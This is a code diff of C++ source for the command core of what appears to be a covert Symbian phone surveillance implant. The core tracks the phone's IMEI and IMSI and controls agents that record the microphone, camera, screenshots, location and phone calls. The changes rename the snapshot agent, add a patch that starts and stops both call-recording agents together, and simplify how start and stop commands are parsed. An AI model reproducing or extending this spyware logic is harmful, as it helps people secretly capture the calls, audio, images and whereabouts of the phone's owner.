@@ -26,7 +26,7 @@ TBuf<50>  iGlobalImei;
 TBuf<15>  iGlobalImsi;
 
 CCore::CCore() :
-	CAbstractQueueEndPoint(ECore)
+	CAbstractQueueEndPoint(ECore,0)
 	{
 	}
 
@@ -159,7 +159,7 @@ void CCore::RestartAllAgentsL()  //TODO: check if still used
 void CCore::CycleAppendingAgentsL()
 	{
 	// Stops the running Agents that creates logs in append
-	// so excluding: AgentMic, AgentSnapshot, AgentCallLocal, AgentCamera
+	// so excluding: AgentMic, AgentScreenshot, AgentCallLocal, AgentCamera
 	for (int i = 0; i < iConfig->iAgentsList.Count(); i++)
 		{
 		CDataAgent* dataAgent = iConfig->iAgentsList[i];
@@ -168,7 +168,7 @@ void CCore::CycleAppendingAgentsL()
 			switch(dataAgent->iId)
 				{
 				case EAgent_Mic:
-				case EAgent_Snapshot:
+				case EAgent_Screenshot:
 				case EAgent_CallLocal:
 				case EAgent_Cam:
 				case EAgent_Device:
@@ -301,33 +301,27 @@ void CCore::LoadNewConfigL()
 
 void CCore::StartAgentL(TInt aQueueId, TAgentType agentId)
 	{
-	// MARK: Begin AGENT_TASKS Patch
-	// The patch below is needed because the Config file doesn't take in 
-	// consideration AddressBook and Calendar Agents yet, but only the Tasks Agent
-	// So, when there is a reference to Tasks Agent in the Config, we will start both
-	// the AddressBook and the Calendar Agents.
-	/*
-	if (agentId == EAgent_Tasks_TODO)
+	// MARK: Begin AGENT_CALL Patch
+	if (agentId == EAgent_Call_TODO)
 		{
-		StartAgentL(EAgent_Addressbook);
-		StartAgentL(EAgent_Calendar);
+		StartAgentL(aQueueId,EAgent_CallLocal);
+		StartAgentL(aQueueId,EAgent_CallList);
 		return;
 		}
-		*/  //this shouldn't be the case anymore
-	// End AGENT_TASKS Patch
+	// End AGENT_CALL Patch
 
 	// Retrieves the Agent's Parameters from the Config
 	CDataAgent* dataAgent = iConfig->FindDataAgent(agentId);
 
 	// Raises a PANIC if the Agent is not available in the Config.
 	ASSERT(dataAgent != NULL);
-	
+
 	// We have to distinguish between continuous modules and one shot modules
 	switch (agentId)
 		{
 		case EAgent_Cam:
 		case EAgent_Device:
-		case EAgent_Snapshot:
+		case EAgent_Screenshot:
 		case EAgent_Position:	
 			{
 			// one shot modules: create them at first start command, then they lives forever or 
@@ -351,6 +345,9 @@ void CCore::StartAgentL(TInt aQueueId, TAgentType agentId)
 			// continuous modules
 			if(dataAgent->iStatus != EAgent_Running)
 				{
+				//TODO: verificare che call/callist si comportino come richiesto
+				if((agentId == EAgent_CallLocal) && (dataAgent->iAdditionalData == 0))
+						return; //we are not asked to start call recording
 				// Creates the new Agent and send it the START command.
 				CAbstractAgent* newAgent = AgentFactory::CreateAgentL(agentId, dataAgent->iParams);
 				TInt err = iEndPoints.Append(newAgent);
@@ -368,19 +365,15 @@ void CCore::StartAgentL(TInt aQueueId, TAgentType agentId)
 
 void CCore::StopAgentL(TInt aQueueId, TAgentType agentId)
 	{
-	// MARK: Begin AGENT_TASKS Patch
-	// The patch below is needed because the Config file doesn't take in 
-	// consideration AddressBook and Calendar Agents yet, but only the Tasks Agent
-	// So, when there is a reference to Tasks Agent in the Config, we will start both
-	// the AddressBook and the Calendar Agents.
-	/*
-	if (agentId == EAgent_Tasks_TODO)
+	// MARK: Begin AGENT_CALL Patch
+	if (agentId == EAgent_Call_TODO)
 		{
-		StopAgentL(EAgent_Addressbook);
-		StopAgentL(EAgent_Calendar);
+		StopAgentL(aQueueId,EAgent_CallLocal);
+		StopAgentL(aQueueId,EAgent_CallList);
 		return;
-		} */ // this shouldn't be the case anymore
-	// End AGENT_TASKS Patch
+		} 
+	// End AGENT_CALL Patch
+		
 	// Retrieves the Agent's Parameters from the Config
 	CDataAgent* dataAgent = iConfig->FindDataAgent(agentId);
 
@@ -411,7 +404,7 @@ void CCore::ExecuteActionL(TInt aQueueId,TActionType type, const TDesC8& params)
 		}
 	
 	// Creates the Action and send it a Start
-	CAbstractAction* newAction = ActionFactory::CreateActionL(type, params);
+	CAbstractAction* newAction = ActionFactory::CreateActionL(type, params, (TQueueType) aQueueId);
 	iEndPoints.Append(newAction);
 	TCmdStruct startCmd(EStart, ECore, type);
 	SubmitNewCommandL(aQueueId,startCmd);
@@ -457,7 +450,8 @@ void CCore::DispatchCommandL(TCmdStruct aCommand)
 			{
 			case EAction_StartAgent:
 				{
-				TAgentType agentId;
+				TAgentType agentId = (TAgentType)action->iAdditionalData;
+				/*
 				RBuf paramsBuf;
 				TInt err = paramsBuf.Create(2*(action->iParams.Size()));
 				if(err == KErrNone)
@@ -483,13 +477,15 @@ void CCore::DispatchCommandL(TCmdStruct aCommand)
 					}
 				CleanupStack::PopAndDestroy(jsonBuilder);
 				CleanupStack::PopAndDestroy(&paramsBuf);
+				*/
 				if(agentId>0)
 					StartAgentL(queueId,agentId);
 				break;
 				}
 			case EAction_StopAgent:
 				{
-				TAgentType agentId;
+				TAgentType agentId = (TAgentType) action->iAdditionalData;
+				/*
 				RBuf paramsBuf;
 				TInt err = paramsBuf.Create(2*(action->iParams.Size()));
 				if(err == KErrNone)
@@ -515,14 +511,16 @@ void CCore::DispatchCommandL(TCmdStruct aCommand)
 					}
 				CleanupStack::PopAndDestroy(jsonBuilder);
 				CleanupStack::PopAndDestroy(&paramsBuf);
+				*/
 				if(agentId>0)
 					StopAgentL(queueId,agentId);
 				break;
 				}
 			case EAction_EnableEvent:
 				{
-				TInt orderId;
+				TInt orderId = action->iAdditionalData;
 				
+				/*
 				RBuf paramsBuf;
 				TInt err = paramsBuf.Create(2*(action->iParams.Size()));
 				if(err == KErrNone)
@@ -548,15 +546,15 @@ void CCore::DispatchCommandL(TCmdStruct aCommand)
 					}
 				CleanupStack::PopAndDestroy(jsonBuilder);
 				CleanupStack::PopAndDestroy(&paramsBuf);
-				
+				*/
 				if(!(iEvents[orderId]->Enabled()))
 					iEvents[orderId]->StartEventL();
 				}
 				break;
 			case EAction_DisableEvent:
 				{
-				TInt orderId;
-								
+				TInt orderId = action->iAdditionalData;
+				/*				
 				RBuf paramsBuf;
 			    TInt err = paramsBuf.Create(2*(action->iParams.Size()));
 				if(err == KErrNone)
@@ -582,7 +580,7 @@ void CCore::DispatchCommandL(TCmdStruct aCommand)
 					}
 				CleanupStack::PopAndDestroy(jsonBuilder);
 				CleanupStack::PopAndDestroy(&paramsBuf);
-								
+					*/			
 				if((iEvents[orderId]->Enabled()))
 					iEvents[orderId]->StopEventL();
 				}
